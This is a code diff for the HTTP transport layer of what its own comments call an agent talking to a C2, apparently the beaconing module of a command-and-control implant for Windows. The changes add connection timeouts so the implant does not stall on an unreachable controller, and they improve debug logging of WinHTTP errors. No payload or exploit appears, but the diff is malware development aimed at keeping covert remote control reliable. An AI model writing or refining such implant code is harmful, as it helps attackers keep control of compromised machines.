@@ -15,7 +15,24 @@ BOOL http_init(void) {
         WINHTTP_NO_PROXY_BYPASS,
         0
     );
-    return g_hSession != NULL;
+    if (!g_hSession) return FALSE;
+
+    /*
+     * Set explicit timeouts to prevent indefinite blocking.
+     * Without these, WinHTTP uses system defaults:
+     *   DNS resolve = infinite(!), connect = 60s, send = 30s, receive = 30s
+     * A single unreachable C2 can block the agent for minutes per attempt.
+     *
+     * Args: hSession, DNS resolve ms, connect ms, send ms, receive ms
+     */
+    WinHttpSetTimeouts(g_hSession,
+        5000,   /* DNS resolve: 5 seconds  */
+        10000,  /* Connect:     10 seconds */
+        15000,  /* Send:        15 seconds */
+        15000   /* Receive:     15 seconds */
+    );
+
+    return TRUE;
 }
 
 void http_cleanup(void) {
@@ -121,10 +138,11 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     if (port == 0) port = isHttps ? 443 : 80;
 
     /* Connect */
-    DBG("[http] connecting to port %u (https=%d)", port, isHttps);
+    DBG("[http] connecting to %S:%u (https=%d)", hostname, port, isHttps);
     HINTERNET hConnect = WinHttpConnect(g_hSession, hostname, port, 0);
     if (!hConnect) {
-        DBG("[http] WinHttpConnect FAILED (err=%u)", GetLastError());
+        DWORD err = GetLastError();
+        DBG("[http] WinHttpConnect FAILED (err=%u / 0x%08X)", err, err);
         free(wUrl);
         return FALSE;
     }
@@ -208,14 +226,22 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     }
     free(b64_val);
     if (!ok) {
-        DBG("[http] WinHttpSendRequest FAILED (err=%u)", GetLastError());
+        DWORD err = GetLastError();
+        DBG("[http] WinHttpSendRequest FAILED (err=%u / 0x%08X)", err, err);
+        /* Common errors:
+         * 12002 = ERROR_WINHTTP_TIMEOUT (connect/send timeout)
+         * 12007 = ERROR_WINHTTP_NAME_NOT_RESOLVED (DNS failed)
+         * 12029 = ERROR_WINHTTP_CANNOT_CONNECT (refused / unreachable)
+         * 12175 = ERROR_WINHTTP_SECURE_FAILURE (TLS error)
+         */
         goto cleanup;
     }
 
     /* Receive response */
     ok = WinHttpReceiveResponse(hRequest, NULL);
     if (!ok) {
-        DBG("[http] WinHttpReceiveResponse FAILED (err=%u)", GetLastError());
+        DWORD err = GetLastError();
+        DBG("[http] WinHttpReceiveResponse FAILED (err=%u / 0x%08X)", err, err);
         goto cleanup;
     }
 
